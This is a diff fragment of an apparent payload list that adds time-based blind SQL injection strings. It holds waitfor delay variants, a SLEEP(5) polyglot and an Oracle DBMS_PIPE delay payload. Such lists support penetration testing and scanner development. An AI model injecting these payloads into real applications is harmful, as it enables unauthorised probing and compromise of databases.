@@ -14,7 +14,12 @@ payload
 
 `5-SLEEP(5)/*'-SLEEP(5)-'"-SLEEP(5)-"*/`
 
+` waitfor delay '0:0:5' --`
+
+`' waitfor delay '0:0:5' --`
+
 `') waitfor delay '0:0:5' --`
+
 `) waitfor delay '0:0:5' --`
 
 `OR 8003=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110)||CHR(99)||CHR(76)||CHR(110),5)`
